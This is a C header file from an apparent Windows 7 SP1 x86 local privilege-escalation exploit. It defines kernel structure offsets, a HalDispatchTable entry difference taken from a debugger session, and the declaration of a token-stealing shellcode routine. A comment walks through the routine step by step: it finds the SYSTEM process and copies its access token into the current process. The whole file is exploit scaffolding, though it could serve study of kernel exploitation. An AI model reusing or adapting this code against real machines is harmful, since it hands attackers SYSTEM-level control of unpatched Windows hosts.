#pragma once

#include <stdio.h>

#define STR1(x) #x
#define STR(x)	STR1(x)

//
// Windows 7 SP1 x86, English
//
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

/*
 * Difference in bytes between HalpSetSystemInformation and
 * HaliQuerySystemInformation, or more formally between:
 *		diff := HalDispatchTable[2] - HalDispatchTable[1]
 *
 * 1: kd> dps poi(hal!HalDispatchTable)
 * 8292d400  00000004
 * 8292d404  82c3d8a2 hal!HaliQuerySystemInformation
 * 8292d408  82c3e1b4 hal!HalpSetSystemInformation
 *
 * 2: kd> ? 0x82c3e1b4 - 0x82c3d8a2
 * Evaluate expression: 2322 = 00000912
**/
#define HAL_THIRD_TO_SECOND_ENTRY_DIFFERENCE	0x912


#define USE_INT_3_IN_SHELLCODE

extern "C" {
	//
	// GCC naked function being a Kernel Token stealing 
	// shellcode implementation, operating in the following manner:
	// 		1. Get the Kernel Processor Control Region current thread
	//		2. Get the _EPROCESS pointer from APC_STATE structure within _KTHREAD
	//		3. Store pointer of the current process' _EPROCESS structure
	// 		4. Search for process with system's pid = 4
	//			4a. Traverse ActiveProcessLinks.Flink pointers until you find PID=4
	//		5. Get system process' token value (_EPROCESS.Token)
	//			5a. And-out the lower token's bits to zero-out the ReferenceCounter
	//			5b. Then retrieve ReferenceCounter of current process' token
	//			5c. Then merge SYSTEM's token value with ReferenceCounter of current process' token
	//		6. Replace target process' token with that merged with system's one. 
	//		7. Restore EBP, return NTSTATUS_SUCCESS and exit cleanly.
	//
	//static void token_stealing_win7() __attribute__((naked));
	
	extern void *tokenStealingPayloadRealPointer;
	extern size_t tokenStealingPayloadSize;

	void token_stealing_win7();
}


